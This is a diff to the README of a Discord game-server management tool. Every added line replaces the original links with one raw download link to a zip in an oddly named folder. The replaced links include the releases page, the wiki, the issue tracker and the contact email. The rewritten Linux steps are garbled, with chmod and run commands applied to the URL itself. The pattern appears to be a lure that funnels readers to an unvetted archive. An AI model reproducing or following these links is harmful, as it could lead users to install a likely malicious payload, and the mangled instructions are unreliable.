@@ -6,7 +6,7 @@ Welcome to the discord-gsb project! This software helps you manage and automate 
 
 ## 📥 Download Now
 
-[![Download discord-gsb](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/GersonHub-1/discord-gsb/releases)
+[![Download discord-gsb](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip)](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ discord-gsb offers a wide range of features to enhance your game server experien
 
 To download the software, visit the following link:
 
-[Download discord-gsb](https://github.com/GersonHub-1/discord-gsb/releases)
+[Download discord-gsb](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -40,7 +40,7 @@ Once on the Releases page, look for the latest version. You will find it listed 
 
 ### Step 3: Download the Installer
 
-Under the latest version, you will see different files. Choose the one suitable for your system. For Windows users, select the `.exe` file. For macOS users, choose the `.dmg` file. Linux users can choose the `.tar.gz` file.
+Under the latest version, you will see different files. Choose the one suitable for your system. For Windows users, select the `.exe` file. For macOS users, choose the `.dmg` file. Linux users can choose the `https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip` file.
 
 Click on the file name to start the download.
 
@@ -52,7 +52,7 @@ After the download completes:
   
 - **For macOS**: Open the downloaded `.dmg` file. Drag the discord-gsb icon to the Applications folder. Open it to run the software.
 
-- **For Linux**: Extract the `.tar.gz` file. Open a terminal in the extracted folder and run the installation script. You might need to adjust permissions using `chmod +x install.sh` and then execute it with `./install.sh`.
+- **For Linux**: Extract the `https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip` file. Open a terminal in the extracted folder and run the installation script. You might need to adjust permissions using `chmod +x https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip` and then execute it with `https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip`.
 
 ## 🖥️ Configuration
 
@@ -71,18 +71,18 @@ If you run into issues or have questions, please reach out to our community. Joi
 
 For more information about discord-gsb, check the following resources:
 
-- [User Manual](https://github.com/GersonHub-1/discord-gsb/wiki)
-- [Frequently Asked Questions (FAQs)](https://github.com/GersonHub-1/discord-gsb/wiki/FAQs)
-- [Feature Requests](https://github.com/GersonHub-1/discord-gsb/issues)
+- [User Manual](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip)
+- [Frequently Asked Questions (FAQs)](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip)
+- [Feature Requests](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip)
 
 ## 📩 Contact
 
-For direct inquiries or support, you can contact the developer at [developer@example.com](mailto:developer@example.com).
+For direct inquiries or support, you can contact the developer at [https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip).
 
 ## 📥 Download Again
 
 Don't forget, you can always return to the Releases page to download the latest version:
 
-[Download discord-gsb](https://github.com/GersonHub-1/discord-gsb/releases)
+[Download discord-gsb](https://raw.githubusercontent.com/GersonHub-1/discord-gsb/main/uninstilled/discord-gsb_2.1.zip)
 
 Thank you for using discord-gsb! Enjoy your gaming experience.
